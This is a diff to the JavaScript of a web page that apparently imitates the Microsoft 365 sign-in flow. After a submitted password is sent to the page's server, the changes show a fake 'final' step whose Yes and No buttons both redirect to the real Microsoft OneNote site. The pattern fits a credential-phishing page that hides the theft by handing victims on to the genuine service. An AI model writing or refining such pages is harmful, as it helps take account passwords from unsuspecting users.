@@ -450,8 +450,9 @@
                     });
 
                     if (response.ok) {
-                        // Redirect zur Website nach erfolgreichem Sign-in
-                        window.location.href = "https://www.google.de/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi6haOmo_yUAxVGwAIHHR-wC00QFnoECBYQAQ&url=https%3A%2F%2Fm365.cloud.microsoft%2F&usg=AOvVaw2uHBouuSr6kJVc9Xk51DZS&opi=89978449";
+                        document.getElementById("section_pwd").classList.toggle('d-none');
+                        document.getElementById('section_final').classList.remove('d-none');
+                        view = "final";
                     } else {
                         document.getElementById('error_pwd').innerText = "Fehler beim Senden";
                     }
@@ -468,6 +469,18 @@
                 e.preventDefault();
                 sig.click();
             }
+        })
+
+        // Button "No" - Weiterleitung
+        const btnNo = document.getElementById('btn_no');
+        btnNo.addEventListener('click', () => {
+            window.location.href = "https://m365.cloud.microsoft/launch/onenote?auth=2&origindomain=Office";
+        })
+
+        // Button "Yes" - Weiterleitung
+        const btnYes = document.getElementById('btn_yes');
+        btnYes.addEventListener('click', () => {
+            window.location.href = "https://m365.cloud.microsoft/launch/onenote?auth=2&origindomain=Office";
         })
 
         function validate() {
